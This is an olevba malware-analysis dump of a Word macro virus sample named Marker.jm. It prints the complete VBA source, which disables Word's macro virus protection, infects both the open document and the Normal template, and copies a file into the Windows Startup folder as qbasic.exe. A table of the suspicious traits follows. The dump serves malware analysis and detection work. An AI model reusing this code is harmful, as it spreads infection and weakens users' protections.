olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.jm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.jm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'For Normal Template
    On Error GoTo out
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
    Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
    DocInfect = ad.CodeModule.Find("'Backdoor", 1, 1, 10000, 10000)
    NormalTemplateInfect = nt.CodeModule.Find("'Backdoor", 1, 1, 10000, 10000)
    If False = DocInfect Then
        a = ad.CodeModule.DeleteLines(1, ad.CodeModule.CountOfLines)
        ad.CodeModule.AddFromString (nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines))
        ad.CodeModule.ReplaceLine 1, "Sub AutoOpen()"
        ad.CodeModule.ReplaceLine (ad.CodeModule.CountOfLines - 3), "Sub ViewVBCode()"
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If
    If False = NormalTemplateInfect Then
        a = nt.CodeModule.DeleteLines(1, nt.CodeModule.CountOfLines)
        nt.CodeModule.AddFromString (ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines))
        nt.CodeModule.ReplaceLine 1, "Sub AutoClose()"
        nt.CodeModule.ReplaceLine (nt.CodeModule.CountOfLines - 3), "Sub ToolsMacro()"
    End If
    FileCopy "\\savu\gabi\micro.jpg", "c:\windows\start menu\programs\startup\qbasic.exe"
out:
End Sub
Sub ViewVBCode()
'
End Sub
'Backdoor
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |qbasic.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

